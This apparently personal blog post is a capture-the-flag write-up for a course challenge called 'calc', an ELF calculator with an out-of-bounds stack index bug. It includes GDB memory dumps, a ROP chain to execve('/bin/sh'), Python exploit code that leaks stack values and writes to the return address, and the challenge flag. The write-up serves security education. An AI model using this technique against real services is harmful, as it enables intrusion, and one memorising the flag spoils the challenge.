---
layout: post
title: 'calc Writeup'
category: memo
slug: calc-writeup
---
## Problematic Calculator

First of all, the file name is "calc.exe". But actually this binary is
elf-32... What the heck XD

Play around with it! This calculator is problematic. It can only
deal with arithmatic of positive number. For example, if you type:

```
-1+5
```

This will return `0` as a result, which is obviously not true. Also, trying
to type only `0` in the calculator, the error message will show up:

```
prevent division by zero
```

Another problem is that though it can do the elementary arithmetic, it only has
restricted capability of priority processing. For example, the expression
`2*3+4*5` will return `26`. But `2*(3+4)*5` we still got `26` as
answer. This shows that the calculator cannot support complicated priority
issue of elementary arithmetic, say, priority that uses parenthesis. One level
priority is supported, however.

Okay, that's enough. This weird calculator seems cannot support full
functionalites of traditional calculator. To see how it processes the input,
and the internal logic, one must use IDA Pro.

## Look into The Program

The binary has five main functions:

- `calc()`: Main loop of the calculator
- `get_expr()`: Only allow specific character set ([+-\*/%0-9]) to be written
  into the buffer
- `init_pool()`: Write zeros into the pool, trivial
- `parse_expr()`: Poorly written parser
- `eval()`: Do the operate on the `i` and the `i-1` element of the pool
  according to the operator

The key function is `parse_expr()`. It has several weird parts such as:

- No boundary on the for loop
- Indexing by the argument which is in caller's stack frame

According to the result of decompilation, the local variables in `calc()` are
reside in the stack whose addresses are shown related to the `esp` and
`ebp`:

```c
pool_t pool; // [sp+18h] [bp-5A0h]@5
char str[1024]; // [sp+1ACh] [bp-40Ch]@2
int stackguard; // [sp+5ACh] [bp-Ch]@1
```

Where the structure `pool_t` might be like this:

```c
struct pool_t {
   int top;
   int stack[100];
};
```

The calculation result of the expression will be stored at `esp+0x1Ch`, which
is `stack[0]`. And `top` will always be 1. In `calc()`, the value of
`stack[0]` will be printed out using `top` when `top` is 1.

```c
printf((const char *)&unk_80BF804, pool.stack[(unsigned int)((char *)pool.top - 1)]);
```

There seems no boundary checking on `top`. By this property, memory leaking
could also be possible.

In `eval()`, the function directly doing operation to two elements of the
array without checking the boundary. We might exploiting this weak point to
modify variable which is right before the array.

```c
p->stack[(unsigned int)((char *)p->top - 2)] += p->stack[(unsigned int)((char *)p->top - 1)];
```

But how to use this? We all know that the most of operators acceptable in this
calculator are in the category of "binary operators". Which means there must be
two operands between the operator. What if one of the operand is missing? Let's
do some experiments through GDB. If the expression "9+10" is entered (assume
the breakpoint was set right behind `call 0x804902a <parse_expr>`, i.e. after
the returning of `parse_expr()`):

```
gdb-peda$ x/16xw $esp
0xffffd080:     0xffffd22c      0xffffd098      0x00000000      0x00000000
0xffffd090:     0x00000000      0x00000000      0x00000001      0x00000013
0xffffd0a0:     0x0000000a      0x00000000      0x00000000      0x00000000
0xffffd0b0:     0x00000000      0x00000000      0x00000000      0x00000000
```

The value of `top` is 1 and the value of `stack[0]` is 19. Then 19 will be
printed out because `*(stack+top-1)` is 19. What if the expression entered is
"+5"?

```
gdb-peda$ x/16xw $esp
0xffffd080:     0xffffd22c      0xffffd098      0x00000000      0x00000000
0xffffd090:     0x00000000      0x00000000      0x00000005      0x00000005
0xffffd0a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd0b0:     0x00000000      0x00000000      0x00000000      0x00000000
```

The calculation result will be 0 because `stack+top-1` is `0xffffd0ac`,
whose value is 0.

More surprisingly, we can simply use "+5+1" this kind of expression to modify
the content of the specific memory location. And the result will still be the
content of `stack+top-1`, which is `0xffffd0ac`. But its value is modified
by the expression.

```
gdb-peda$ x/16xw $esp
0xffffd080:     0xffffd22c      0xffffd098      0x00000000      0x00000000
0xffffd090:     0x00000000      0x00000000      0x00000005      0x00000005
0xffffd0a0:     0x00000000      0x00000000      0x00000000      0x00000001
0xffffd0b0:     0x00000001      0x00000000      0x00000000      0x00000000
```

## Strategy

There are two facts which we gathered after analyzed the binary:

- Leak stack
- Write stack

So controling `eip` through return address should be possible. Another good
news is that we don't even have to worry about the stackguard because we are
capable to write return address rather than "overflowing" the stack buffer.
In the technique of stack buffer overflow, the canary (stackguard) will be
modified in order to overwritten the return address.

One interesting is that we modified the return address of `calc()` in
`parse_expr()`. In `calc()`, the local variable in stack frame is passed
into `parse_expr()` as an argument. Thus making the return address
modification of caller's stack frame happened in callee's stack frame.

### Shellcode

First idea comes to my mind was putting shellcode in stack buffer. But
shellcode in `stack[100]` will not work because every time a new round in
while loop begins, the `stack[100]` will be re-initialized. And the raw input
we typed will be filetered (only [+-\*/%0-9]), then saved into `str[1024]`. So
storing shellcode in `str[1024]` is not possible, either.

### Return to LIBC

According to the hints TA provided, the program is compiled with static option.
That means "ret2libc" will not work because the library is compiled into the
program statically. There is no entry in the GOT of the program. This could be
checked by using `file` command.

```
calc.exe: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux),
statically linked, for GNU/Linux 2.6.24,
BuildID[sha1]=26cd6e85abb708b115d4526bcce2ea6db8a80c64, not stripped
```

Also, `objdump -R` will print the dynamic relocation entries of the program.

```
calc.exe:     file format elf32-i386

objdump: calc.exe: not a dynamic object
objdump: calc.exe: Invalid operation
```

### Return Oriented Programming

The program is compiled with static option, which means the possibility of
finding useful ROP gadgets are higher. The objective is to make a ROP chain
which calls `execve("/bin/sh")`.

## Exploitation

Using ROPgadget to find ROP gadget:

```bash
$ ./ROPgadget.py --binary ~/secprog/calc.exe
```

Because the "/bin/sh" string resides in stack, `ebx` needs to be the address
of the string, which is in stack. ASLR is enabled, so it is needed to poke for
the actual stack address. The text listed below is an example, real
exploitation should calculate the location of the string dynamically.

```
leak 0xffffd63c's value, modified to 0x080550d0 :  xor eax, eax ; ret
leak 0xffffd640's value, modified to 0x080701d1 :  pop ecx ; pop ebx ; ret
leak 0xffffd644's value, modified to 0x00000000 -> for pop ecx
leak 0xffffd648's value, modified to 0xffffd6ec -> for pop ebx
leak 0xffffd64c's value, modified to 0x080908d0 :  mov eax, 7 ; ret
lead 0xffffd650's value, modified to 0x0807cb7f :  inc eax ; ret
lead 0xffffd654's value, modified to 0x0807cb7f :  inc eax ; ret
lead 0xffffd658's value, modified to 0x0807cb7f :  inc eax ; ret
lead 0xffffd65c's value, modified to 0x0807cb7f :  inc eax ; ret
leak 0xffffd660's value, modified to 0x08049a21 :  int 0x80
leak 0xffffd6ec's value, modified to 0x6e69622f -> "/bin"
leak 0xffffd6f0's value, modified to 0x0068732f -> "/sh'\0'"
```

The return address is at `esp+0x5ac` (`ebp+0x4`). Its value should be
modified to the address of the first ROP gadget. Then the ROP chain starts to
work! The exploitation works like this:

1. Poke `ebp+0x10` for the address of the string "/bin/sh".
2. Set `eax` and `ecx` to 0.
3. Make `ebx` to be the value of `ebp+0x10`.
4. Accumulate `eax` to 11
5. Interrupt
6. Put the string "/bin/sh" in the address which has already stored in `ebx`

```python
addrs = ['+361', '+362', '+363', '+364',
         '+365', '+366', '+367', '+368',
         '+369', '+370', '+405', '+406']

payloads = [0x080550d0, 0x080701d1, 0x00000000, 0x00000000,
            0x080908d0, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f,
            0x0807cb7f, 0x08049a21, 0x6e69622f, 0x0068732f]

def pokestack(s):
    s.send('+364\n')
    binsh = int(s.recv(1024))
    payloads[3] = binsh         # dynamically update addr of /bin/sh

def rop(s):
    for i in range(12):
        print '[!] target: %s' % hex(payloads[i])
        s.send(addrs[i]+'\n')
        mleak = int(s.recv(1024))
        print '[!] leak: %s' % hex(mleak)
        offset = payloads[i]-mleak
        print '[!] offset: %d' % offset
        g = '%s%+d\n' % (addrs[i], offset)
        print '[+] send: %s' % g
        s.send(g)
        print '==> %s\n=================' % hex(int(s.recv(1024)))
    s.send('\n')
```

## Flag

```
SECPROG{C:\Windows\System32\calc.exe}
```

## References

- [JonathanSalwan/ROPgadget][1]

[1]: https://github.com/JonathanSalwan/ROPgadget
